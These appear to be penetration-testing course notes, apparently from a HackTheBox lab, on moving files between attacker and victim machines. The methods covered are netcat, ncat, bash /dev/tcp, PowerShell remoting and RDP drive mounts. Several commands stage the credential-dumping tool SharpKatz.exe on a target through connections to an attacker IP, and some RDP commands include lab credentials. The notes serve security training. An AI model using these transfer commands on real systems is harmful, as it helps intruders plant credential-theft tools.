
# Alternative File Transfer Methods

## Overview

Beyond traditional methods, there are numerous alternative techniques for transferring files across networks. These include using tools like Netcat, Ncat, RDP, PowerShell sessions, and more. Mastering these methods enhances both offensive and defensive capabilities.

---

## Netcat and Ncat

### Overview

- **Netcat (nc):** Classic utility for reading/writing network connections over TCP/UDP.
- **Ncat:** Modern reimplementation by Nmap, supporting SSL, IPv6, proxies, connection brokering, etc.
- **Note:** In HackTheBox's PwnBox, `nc`, `ncat`, and `netcat` are interchangeable.

### File Transfer with Netcat/Ncat

#### Listening on the Victim (Target) Machine

- **Netcat:**

```bash
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

- **Ncat:**

```bash
bash

victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

#### Sending Files from Attacker to Victim

- **Using Netcat:**

```bash
bash

LeDaav@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
LeDaav@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

- **Using Ncat:**

```bash
bash

LeDaav@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

---

### Reverse: Listening on Attacker, Sending to Victim

- **Listening on port 443:**

```bash
bash

LeDaav@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

- **Victim connects:**

```bash
bash

victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

- **Using Ncat:**

```bash
bash

LeDaav@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

### Using Bash /dev/tcp

- **Sending file:**

```bash
bash

LeDaav@htb[/htb]$ sudo bash -c 'cat SharpKatz.exe > /dev/tcp/192.168.49.128/443'
```

- **Receiving file:**

```bash
bash

victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

---

## PowerShell Session File Transfer

### Using PowerShell Remoting (WinRM)

- **Prerequisites:** Remoting enabled, administrative access.

### Example: Copy Files to/from Remote Machine

- **Create session:**

```powershell
powershell

$Session = New-PSSession -ComputerName DATABASE01
```

- **Copy file to remote:**

```powershell
powershell

Copy-Item -Path C:\localfile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

- **Copy file from remote:**

```powershell
powershell

Copy-Item -Path "C:\Users\Administrator\Desktop\remote.txt" -FromSession $Session -Destination C:\local\
```

### Confirm connectivity:

```powershell
powershell

Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

---

## RDP (Remote Desktop Protocol)

### File Transfer via Copy-Paste

- Use RDP client to copy files between local and remote systems.

### Mount Local Resources (Linux)

- **Using rdesktop:**

```bash
bash

LeDaav@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux=/home/user/rdesktop/files
```

- **Using xfreerdp:**

```bash
bash

LeDaav@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

- Access via `\\tsclient\` in Windows to transfer files.
